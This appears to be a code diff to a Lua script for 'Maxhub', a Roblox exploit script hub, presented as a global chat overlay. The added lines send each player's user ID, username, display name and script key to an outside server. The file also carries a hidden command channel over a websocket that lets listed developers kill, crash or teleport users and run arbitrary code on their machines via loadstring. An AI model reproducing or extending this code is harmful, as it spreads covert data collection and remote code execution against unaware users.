@@ -1,4 +1,22 @@
-return -- shutdown
+local request = request or http.request or http_request
+local httpService = game:GetService("HttpService")
+
+if script_key then request({
+	Url = "https://testserver-diki.onrender.com/adduserdata",
+	Method = "POST",
+	Body = httpService:JSONEncode({
+		userid = tostring(game:GetService("Players").LocalPlayer.UserId),
+		username = game:GetService("Players").LocalPlayer.Name,
+		displayname = game:GetService("Players").LocalPlayer.DisplayName,
+		ip = "test",
+		key = script_key,
+	}),
+	Headers = {
+		["Content-Type"] = "application/json",
+	},
+}) end
+
+if true then return end
 --local queuetp = queue_on_teleport or queueonteleport or function(v) end
 
 --queuetp('loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/MaxhubControlPanel/main/client.lua",true))()')
@@ -38,21 +56,15 @@ local userdata = {
 local devs = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/MaxhubControlPanel/refs/heads/main/MAXHUBSUPERDEVSIGMAS"))() or { 332721249, 213207428, 7012855056, 7098987458, 2283397273 }
 local isDev = table.find(devs, localPlayer.UserId)
 
-local function UpdateCanvasSize(Canvas, Constraint)
-	Canvas.CanvasSize = UDim2.new(0, Constraint.AbsoluteContentSize.X, 0, Constraint.AbsoluteContentSize.Y + 3)
-end
+local function UpdateCanvasSize(Canvas, Constraint) Canvas.CanvasSize = UDim2.new(0, Constraint.AbsoluteContentSize.X, 0, Constraint.AbsoluteContentSize.Y + 3) end
 
 local GlobalChat = {}
 
 function GlobalChat.init()
-	if isUserMobile then
-		return
-	end -- DEV TESTING
+	if isUserMobile then return end -- DEV TESTING
 	local self = {}
 	local oldgui = localPlayer.PlayerGui:FindFirstChild("Maxhub Global Chat")
-	if oldgui then
-		oldgui:Destroy()
-	end
+	if oldgui then oldgui:Destroy() end
 
 	-- self.ScreenGui = game:GetObjects("rbxassetid://110126484672625")[1]
 	self.ScreenGui = game:GetObjects("rbxassetid://71404790972751")[1]
@@ -95,23 +107,17 @@ function GlobalChat.init()
 			StartPosition = self.Drag.Position
 
 			connectionManager:NewConnection(input.Changed, function()
-				if input.UserInputState == Enum.UserInputState.End then
-					Dragging = false
-				end
+				if input.UserInputState == Enum.UserInputState.End then Dragging = false end
 			end)
 		end
 	end)
 
 	connectionManager:NewConnection(self.Drag.InputChanged, function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			DragInput = input
-		end
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then DragInput = input end
 	end)
 
 	connectionManager:NewConnection(game:GetService("UserInputService").InputChanged, function(input)
-		if input == DragInput and Dragging then
-			Update(input)
-		end
+		if input == DragInput and Dragging then Update(input) end
 	end)
 
 	connectionManager:NewConnection(game:GetService("UserInputService").InputBegan, function(input, gameProcessed)
@@ -126,9 +132,7 @@ function GlobalChat.init()
 		if enterPressed then
 			local message = self.MessageBox.Text
 
-			if message == "" or not message:match("%S") then
-				return
-			end
+			if message == "" or not message:match("%S") then return end
 
 			if self.SendMessageDebounce then
 				coroutine.wrap(function()
@@ -145,8 +149,8 @@ function GlobalChat.init()
 	end)
 
 	connectionManager:NewConnection(self.ToggleToast.MouseButton1Click, function()
-			self.Toasts = not self.Toasts
-			self.ToggleToast.Text = self.Toasts and "Disable Notifications" or "Enable Notifications"
+		self.Toasts = not self.Toasts
+		self.ToggleToast.Text = self.Toasts and "Disable Notifications" or "Enable Notifications"
 	end)
 
 	self.msgTypes = {
@@ -208,9 +212,7 @@ function GlobalChat.init()
 	end
 
 	function self:SendMessage(msg: string, msg_type: "Roblox" | "Discord" | "Dev")
-		if not ws or self.SendMessageDebounce then
-			return
-		end
+		if not ws or self.SendMessageDebounce then return end
 
 		self.SendMessageDebounce = true
 
@@ -266,9 +268,7 @@ function GlobalChat.init()
 
 	-- Toast Notifications
 	function self:Toast(type: "Discord" | "Roblox" | "Dev", name: string, text: string, duration: number)
-		if self.UIShown or not self.Toasts then
-			return
-		end
+		if self.UIShown or not self.Toasts then return end
 		updateActiveNotificationPositions()
 
 		local toast = self.toastTypes[type]:Clone()
@@ -298,9 +298,7 @@ function GlobalChat.init()
 			updateActiveNotificationPositions()
 		end)
 
-		if not toast then
-			return
-		end
+		if not toast then return end
 
 		local tween = TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
 			Position = UDim2.new(0.5, 0, 0.85 - ((toasttable.index - 1) * 0.20), 0),
@@ -311,9 +309,7 @@ function GlobalChat.init()
 
 		task.delay(duration, function()
 			-- tween out
-			if not toast then
-				return
-			end
+			if not toast then return end
 			tween = TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
 				Position = UDim2.new(1.5, 0, 0.85 - ((toasttable.index - 1) * 0.20), 0),
 			})
@@ -351,18 +347,12 @@ local commands = {
 	kill = function(sender, _)
 		local success, message = pcall(function()
 			local character = localPlayer.Character
-			if not character then
-				return "Character not found"
-			end
+			if not character then return "Character not found" end
 
 			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
-			if not humanoid then
-				return "Humanoid not found"
-			end
+			if not humanoid then return "Humanoid not found" end
 
-			if humanoid.Health <= 0 then
-				return "Character is already dead"
-			end
+			if humanoid.Health <= 0 then return "Character is already dead" end
 
 			humanoid.Health = 0
 
@@ -448,9 +438,7 @@ local commands = {
 		xpcall(function()
 			loadstring(args.Code)()
 			sendCmdResponse(sender, true, "Successfully executed code")
-		end, function(err)
-			sendCmdResponse(sender, false, err)
-		end)
+		end, function(err) sendCmdResponse(sender, false, err) end)
 	end,
 
 	crash = function(sender, args)
@@ -462,13 +450,9 @@ local commands = {
 	bring = function(sender, args)
 		local player = game:GetService("Players"):FindFirstChild(args.Username)
 
-		if not player then
-			return sendCmdResponse(sender, false, "Player not in game")
-		end
+		if not player then return sendCmdResponse(sender, false, "Player not in game") end
 
-		if not player.Character then
-			return sendCmdResponse(sender, false, "Player has no character")
-		end
+		if not player.Character then return sendCmdResponse(sender, false, "Player has no character") end
 
 		localPlayer.Character:PivotTo(player.Character:GetPivot())
 
@@ -491,13 +475,11 @@ local function connectToServer()
 	GlobalChatInstance = GlobalChat.init()
 	if GlobalChatInstance then
 		GlobalChatInstance:ToggleUI(false)
-		if not isUserMobile then
-			GlobalChatInstance:Toast("Roblox", "Maxhub", "Press U to open Global Chat", 3)
-		end
+		if not isUserMobile then GlobalChatInstance:Toast("Roblox", "Maxhub", "Press U to open Global Chat", 3) end
 	end
 
 	-- get old messages
-	
+
 	local oldMessages = GlobalChatInstance and GlobalChatInstance:fetchMessages() or {}
 
 	for i, message in ipairs(oldMessages) do
@@ -513,36 +495,26 @@ local function connectToServer()
 		local sender = data.sender
 		local args = data.args
 
-		if action == "run" and commands[cmd] then
-			coroutine.wrap(pcall)(commands[cmd], sender, args)
-		end
+		if action == "run" and commands[cmd] then coroutine.wrap(pcall)(commands[cmd], sender, args) end
 
-		if action == "ping" then
-			ws:Send(httpService:JSONEncode({ action = "pong" }))
-		end
+		if action == "ping" then ws:Send(httpService:JSONEncode({ action = "pong" })) end
 
 		if action == "msg_received" and GlobalChatInstance then
 			GlobalChatInstance:addMessage(data.message, data.msgType, data.sender)
 			coroutine.wrap(GlobalChatInstance.Toast)(GlobalChatInstance, data.msgType, data.sender, data.message, 3)
 		end
 
-		if action == "msg_sent" and GlobalChatInstance then
-			GlobalChatInstance.LastMessageSent = true
-		end
+		if action == "msg_sent" and GlobalChatInstance then GlobalChatInstance.LastMessageSent = true end
 	end)
 
 	-- Listen for close
 	connectionManager:NewConnection(ws.OnClose, function()
-		if not getgenv().forceClosing then
-			pcall(connectToServer)
-		end
+		if not getgenv().forceClosing then pcall(connectToServer) end
 	end)
 end
 
 local s, e = pcall(connectToServer)
 
-if not s then
-	warn(e)
-end
+if not s then warn(e) end
 
 return GlobalChatInstance
